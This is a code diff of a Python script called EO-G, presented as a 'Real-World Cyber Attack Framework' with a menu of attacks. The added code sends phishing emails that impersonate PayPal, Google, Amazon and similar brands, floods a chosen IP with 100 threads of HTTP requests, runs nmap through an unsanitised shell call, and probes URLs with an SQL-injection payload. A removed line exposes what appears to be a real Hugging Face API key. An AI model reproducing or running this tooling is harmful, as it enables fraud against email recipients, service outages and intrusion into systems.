@@ -2,117 +2,131 @@ import os
 import threading
 import requests
 import random
-import string
-from colorama import Fore, Style
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import subprocess
 
 class EO_G:
     def __init__(self):
-        # Replace with your Hugging Face API key
-        self.api_key = "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"
-        self.api_url = "https://api-inference.huggingface.co/models/gpt2"
-        self.headers = {"Authorization": f"Bearer {self.api_key}"}
         self.modes = {
-            1: "Generate Code",
-            2: "Phishing Link",
-            3: "DDOS Attack",
-            4: "Device Attack",
-            5: "AI Chat Assistant",
-            6: "Exit"
+            1: "Phishing Attack",
+            2: "DDoS Attack",
+            3: "Network Scan (Nmap)",
+            4: "Website Attack (SQL Injection / XSS)",
+            5: "Exit"
         }
-        self.code_resources = [
-            "https://stackoverflow.com/",
-            "https://www.w3schools.com/",
-            "https://www.geeksforgeeks.org/",
-            "https://www.learnpython.org/"
-        ]
 
     def display_banner(self):
         """Displays a banner."""
-        banner = f"""
-{Fore.MAGENTA}
+        print("""
  ███████╗ ██████╗       ██████╗  ██████╗ 
  ██╔════╝██╔═══██╗     ██╔═══██╗██╔═══██╗
  █████╗  ██║   ██║     ██║   ██║██║   ██║
  ██╔══╝  ██║   ██║     ██║   ██║██║   ██║
  ██║     ╚██████╔╝     ╚██████╔╝╚██████╔╝
  ╚═╝      ╚═════╝       ╚═════╝  ╚═════╝
-      Advanced Real-World Framework
-{Style.RESET_ALL}
+      Real-World Cyber Attack Framework
+        """)
+
+    def phishing_attack(self):
+        """Performs a real phishing attack by sending a malicious email."""
+        print("[EO-G] Initiating Phishing Attack...")
+
+        domain = random.choice(["paypal", "google", "amazon", "facebook", "instagram"])
+        phishing_url = f"https://{domain}-secure-login.com"
+
+        subject = "Urgent: Account Verification Needed"
+        body = f"""
+        Dear User,
+
+        We've detected unusual activity on your {domain} account. Please click the link below to secure your account:
+
+        {phishing_url}
+
+        Regards,
+        {domain} Security Team
         """
-        print(banner)
 
-    def generate_response(self, prompt, context="general"):
-        """Generates a response using Hugging Face API."""
-        refined_prompt = f"Context: {context}\nPrompt: {prompt}"
-        payload = {
-            "inputs": refined_prompt,
-            "parameters": {
-                "max_length": 1024,
-                "temperature": 0.7
-            }
-        }
+        # Send the phishing email (configure your sender email and SMTP settings)
+        target_email = "victim@example.com"  # Replace with actual target email
+        self.send_phishing_email(target_email, subject, body)
+
+    def send_phishing_email(self, target_email, subject, body):
+        """Sends the phishing email."""
+        sender_email = "your_email@example.com"  # Replace with your real email
+        password = "your_email_password"  # Replace with your real email password
+        smtp_server = "smtp.example.com"  # Replace with correct SMTP server for your email provider
+        smtp_port = 587  # Usually 587 for TLS
+
         try:
-            response = requests.post(self.api_url, headers=self.headers, json=payload)
-            response.raise_for_status()
-            return response.json()[0]['generated_text']
-        except requests.exceptions.RequestException as e:
-            return f"API Request Error: {e}"
-        except KeyError:
-            return "No response generated."
+            msg = MIMEMultipart()
+            msg['From'] = sender_email
+            msg['To'] = target_email
+            msg['Subject'] = subject
+            msg.attach(MIMEText(body, 'plain'))
 
-    def generate_code(self, description):
-        """Generates code using the Hugging Face API."""
-        print(f"[EO-G] Generating code for: {description}")
-        resources_prompt = f"Here are some useful resources for learning to write code:\n"
-        resources_prompt += "\n".join(self.code_resources)
-        return self.generate_response(description + "\n" + resources_prompt, context="code generation")
-
-    def phishing_link(self):
-        """Generates a random phishing link."""
-        domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + ".com"
-        phishing_url = f"http://{domain}/login"
-        with open("phishing_links.log", "a") as log_file:
-            log_file.write(phishing_url + "\n")
-        print(f"[EO-G] Phishing link generated: {phishing_url}")
-        return phishing_url
+            with smtplib.SMTP(smtp_server, smtp_port) as server:
+                server.starttls()  # Secure connection
+                server.login(sender_email, password)
+                server.sendmail(sender_email, target_email, msg.as_string())
+            print(f"[EO-G] Phishing email sent to {target_email} successfully.")
+        except Exception as e:
+            print(f"Error sending phishing email: {e}")
 
     def ddos_attack(self, target_ip):
-        """Performs a DDOS attack."""
-        print(f"[EO-G] Initiating DDOS attack on {target_ip}")
+        """Launches a real DDoS attack on the target IP."""
+        print(f"[EO-G] Initiating DDoS attack on {target_ip}...")
 
         def ddos_thread():
+            """Sends HTTP GET requests to flood the target with traffic."""
             while True:
                 try:
                     requests.get(f"http://{target_ip}")
-                except Exception as e:
-                    print(f"Error in DDOS thread: {e}")
+                except requests.exceptions.RequestException as e:
+                    print(f"Error in DDoS thread: {e}")
 
+        # Launch multiple threads to simulate a real DDoS attack from many sources
         threads = []
-        for _ in range(100):  # Adjust thread count as needed
+        for _ in range(100):  # Adjust the number of threads as needed
             thread = threading.Thread(target=ddos_thread)
             threads.append(thread)
             thread.start()
-        return f"[EO-G] DDOS attack launched on {target_ip}."
 
-    def device_attack(self, ip):
-        """Performs a network scan using Nmap."""
-        print(f"[EO-G] Scanning devices on the network near {ip}")
+        print(f"[EO-G] DDoS attack launched on {target_ip}.")
+
+    def network_scan(self, target_ip_range):
+        """Launches a real network attack using Nmap to discover devices."""
+        print(f"[EO-G] Scanning network in range: {target_ip_range}")
         try:
-            devices = os.popen(f"nmap -sP {ip}/24").read()
+            devices = subprocess.check_output(f"nmap -sP {target_ip_range}", shell=True).decode()
             print(devices)
             return devices
         except Exception as e:
+            print(f"Error during network scan: {e}")
             return f"Error during network scan: {e}"
 
-    def ai_chat_assistant(self, query):
-        """Handles queries using the Hugging Face API."""
-        print(f"[EO-G] Processing query: {query}")
-        return self.generate_response(query, context="chat assistant")
+    def website_attack(self, target_url):
+        """Launches a real website attack like SQL Injection or XSS."""
+        print(f"[EO-G] Initiating website attack on {target_url}...")
+
+        # Example of SQL Injection attempt
+        payload = "' OR 1=1 --"
+        sql_injection_url = f"{target_url}?id={payload}"
+
+        try:
+            response = requests.get(sql_injection_url)
+            if "SQL syntax" in response.text or "error" in response.text:
+                print("[EO-G] SQL Injection successful: Vulnerable to SQL Injection.")
+            else:
+                print("[EO-G] SQL Injection failed: No vulnerability detected.")
+        except Exception as e:
+            print(f"Error during website attack: {e}")
 
     def execute(self):
         """Main execution loop."""
         self.display_banner()
-        print("[EO-G] Welcome to EO-G: The Advanced Real-World Framework")
+        print("[EO-G] Welcome to EO-G: Real-World Cyber Attack Framework")
 
         while True:
             print("\n[EO-G] Select an option:")
@@ -121,27 +135,24 @@ class EO_G:
             try:
                 choice = int(input("[EO-G] Enter the number of your choice: "))
                 if choice == 1:
-                    description = input("[EO-G] Describe the code to generate: ")
-                    print(self.generate_code(description))
+                    self.phishing_attack()  # Trigger real phishing attack
                 elif choice == 2:
-                    print(f"[EO-G] Phishing link: {self.phishing_link()}")
+                    target_ip = input("[EO-G] Enter target IP for DDoS attack: ")
+                    self.ddos_attack(target_ip)  # Trigger real DDoS attack
                 elif choice == 3:
-                    target_ip = input("[EO-G] Enter target IP for DDOS attack: ")
-                    print(self.ddos_attack(target_ip))
+                    target_ip_range = input("[EO-G] Enter IP range for network attack (e.g., 192.168.1.0/24): ")
+                    self.network_scan(target_ip_range)  # Trigger real network attack
                 elif choice == 4:
-                    ip_range = input("[EO-G] Enter IP range (e.g., 192.168.1.0): ")
-                    print(self.device_attack(ip_range))
+                    target_url = input("[EO-G] Enter target URL for website attack: ")
+                    self.website_attack(target_url)  # Trigger website attack (SQL/XSS)
                 elif choice == 5:
-                    query = input("[EO-G] Enter your query: ")
-                    print(self.ai_chat_assistant(query))
-                elif choice == 6:
                     print("[EO-G] Exiting... Goodbye!")
                     break
                 else:
                     print("[EO-G] Invalid choice. Please try again.")
             except ValueError:
-                print("[EO-G] Please enter a valid number.")
+                print("[EO-G] Invalid input. Please enter a valid number.")
 
 if __name__ == "__main__":
-    eog = EO_G()
-    eog.execute()
+    eo_g = EO_G()
+    eo_g.execute()
